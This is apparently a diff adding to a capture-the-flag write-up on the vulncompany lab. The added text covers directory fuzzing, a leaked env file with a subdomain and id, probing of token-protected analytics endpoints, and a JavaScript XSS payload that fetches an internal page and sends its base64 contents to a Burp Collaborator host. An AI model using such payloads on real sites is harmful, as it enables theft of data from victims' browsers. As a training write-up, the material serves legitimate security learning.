@@ -375,3 +375,101 @@ Accept-Language: en-US
 Finally flag 2!
 
 ![alt](./images/vulncompany-09.png)
+
+OK so can't access this from this IP. Quick check with setting the X-Forwarded-For header and no difference.
+
+Do a content fuzz on http://vulncompany.co.uk/t0p_s3cr3t_d1rect0ry_2020/FUZZ/ and env comes back as a result. This is a file with the following contents
+
+```
+subdomain=b48fj3
+id=123
+flag=[^FLAG^xxx^FLAG^]
+```
+
+There's flag 3 :)
+
+OK so now I have a subdomain and I have an id, but I don't have a token. Lets check the endpoints we know about to see if it's really required
+
+So the following GET endpoints
+
+- http://b48fj3.vulnanalytics.co.uk/123/ip
+- http://b48fj3.vulnanalytics.co.uk/123/page
+- http://b48fj3.vulnanalytics.co.uk/123/browser
+
+All return a 401 response with 
+
+```
+["Security Token Missing or Invalid"]
+```
+
+Quick test with the remaining POST request
+
+```
+POST /123/data HTTP/1.1
+Host: b48fj3.vulnanalytics.co.uk
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Cookie: ctfchallenge=xxx
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 21
+
+ip=x&page=x&browser=x
+```
+
+And the same response
+
+```
+["Security Token Missing or Invalid"]
+```
+
+OK so I skipped over one result from the fuzz http://vulncompany.co.uk/t0p_s3cr3t_d1rect0ry_2020/FUZZ/. There was also a js directory, I skipped it as it usually gives a 403 response :D.
+
+But in there is a functions.js file with this content
+
+```javascript
+/**
+ * We can use this script for any of our projects that we want to track analytics for
+ */
+
+function loadAnalytics( subdomain ){
+    $.get('load_analytics_data.php?subdomain=' + subdomain ,function( data ){
+        $.each( data, function(k,v){
+            $('#table').append( '<tr>'
+                + '<td>' + v.ip + '</td>'
+                + '<td>' + v.page + '</td>'
+                + '<td>' + v.browser + '</td>');
+        });
+    });
+}
+```
+
+Quick request to http://vulncompany.co.uk/t0p_s3cr3t_d1rect0ry_2020/load_analytics_data.php?subdomain=b48fj3 and I get a page which says
+
+```
+No Access from this IP
+```
+
+Again using X-Forwarded-For seems to make no difference. So can I use the XSS from before to get this data?
+
+Maybe something like...
+
+```javascript
+fetch('http://vulncompany.co.uk/t0p_s3cr3t_d1rect0ry_2020/load_analytics_data.php?subdomain=b48fj3')
+.then(res => res.text())
+.then(data => {
+    var i=new Image();
+    i.src = 'http://zorq8hqhnu2u3tnbx200ekgldcj27r.oastify.com/?data=' +btoa(data);
+    document.getElementsByTagName('body')[0].appendChild(i);
+})
+.error(error => {
+    var i=new Image();
+    i.src = 'http://zorq8hqhnu2u3tnbx200ekgldcj27r.oastify.com/?error=' +btoa(error);
+    document.getElementsByTagName('body')[0].appendChild(i);
+});
+```
+
+And no this didn't work no response from burp collab, although it did work when calling it from my dev console, but obviously this isn't useful as it gives the same 'No Access from this IP' response.
